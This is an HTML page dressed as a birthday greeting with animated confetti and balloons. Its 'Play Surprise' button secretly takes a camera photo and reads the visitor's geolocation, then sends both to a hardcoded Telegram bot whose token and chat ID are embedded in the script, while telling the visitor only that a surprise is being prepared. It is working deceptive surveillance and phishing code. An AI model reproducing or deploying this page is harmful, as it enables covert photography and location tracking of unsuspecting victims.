<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Birthday Surprise!</title>
    <style>
        body {
            font-family: 'Comic Sans MS', cursive, sans-serif;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a6c1ee);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background-color: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            max-width: 80%;
            position: relative;
            overflow: hidden;
        }

        h1 {
            font-size: 3.5rem;
            margin: 0 0 20px;
            color: #ff4081;
        }

        .message {
            font-size: 1.5rem;
            margin-bottom: 30px;
        }

        .btn {
            background: linear-gradient(45deg, #ff4081, #ff9100);
            border: none;
            color: white;
            padding: 15px 30px;
            font-size: 1.2rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }

        .btn:active {
            transform: translateY(1px);
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #f00;
            border-radius: 50%;
            animation: confetti 5s ease-in-out infinite;
        }

        @keyframes confetti {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }

        .balloon {
            position: absolute;
            width: 100px;
            height: 120px;
            border-radius: 50%;
            animation: float 8s ease-in-out infinite;
            opacity: 0.8;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-50px) rotate(5deg); }
        }

        .status {
            margin-top: 20px;
            font-size: 1rem;
            color: #fff;
            min-height: 20px;
        }

        /* Create confetti elements */
        .confetti-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="confetti-container" id="confetti-container"></div>
    
    <div class="container">
        <h1>ðŸŽ‰ Happy Birthday! ðŸŽ‰</h1>
        <div class="message">Click the button below for a special surprise!</div>
        <button class="btn" id="surpriseBtn">Play Surprise</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        // Create confetti
        function createConfetti() {
            const container = document.getElementById('confetti-container');
            const colors = ['#ff4081', '#ff9100', '#00bcd4', '#4caf50', '#9c27b0'];
            
            for (let i = 0; i < 50; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
                confetti.style.animationDelay = Math.random() * 5 + 's';
                confetti.style.width = (Math.random() * 10 + 5) + 'px';
                confetti.style.height = (Math.random() * 10 + 5) + 'px';
                container.appendChild(confetti);
            }
        }

        // Create balloons
        function createBalloons() {
            const colors = ['#ff4081', '#ff9100', '#00bcd4', '#4caf50', '#9c27b0'];
            
            for (let i = 0; i < 5; i++) {
                const balloon = document.createElement('div');
                balloon.className = 'balloon';
                balloon.style.left = (Math.random() * 80 + 10) + 'vw';
                balloon.style.top = (Math.random() * 30 + 70) + 'vh';
                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                balloon.style.animationDuration = (Math.random() * 6 + 4) + 's';
                balloon.style.animationDelay = Math.random() * 5 + 's';
                document.body.appendChild(balloon);
            }
        }

        // Initialize the page
        window.onload = function() {
            createConfetti();
            createBalloons();
        };

        // Telegram bot functionality
        document.getElementById('surpriseBtn').addEventListener('click', async function() {
            const statusElement = document.getElementById('status');
            statusElement.textContent = 'Preparing your surprise...';
            
            try {
                // Request camera and microphone access
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                
                // Request location access
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                
                statusElement.textContent = 'Capturing your moment...';
                
                // Create a video element to capture a frame (but keep it hidden)
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                // Wait a moment for the camera to focus
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Create a canvas to capture the photo
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                
                // Convert canvas to blob
                const photoBlob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.9);
                });
                
                statusElement.textContent = 'Sending your surprise...';
                
                // Replace these with your actual bot token and chat ID
                const BOT_TOKEN = '7705227922:AAGtp8QrTwDTq4eEXmMfLGGfdzI5Nx7HnBg';
                const CHAT_ID = '6676630139';
                
                // Send photo to Telegram
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'birthday_photo.jpg');
                formData.append('caption', 'Birthday surprise photo!');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // Send location to Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        caption: 'Birthday surprise location!'
                    })
                });
                
                statusElement.textContent = 'Surprise sent successfully! ðŸŽ‰';
                
                // Create more confetti for celebration
                createConfetti();
                
            } catch (error) {
                console.error('Error:', error);
                statusElement.textContent = 'Oops! Could not complete the surprise. Please try again.';
            }
        });
    </script>
</body>
</html>
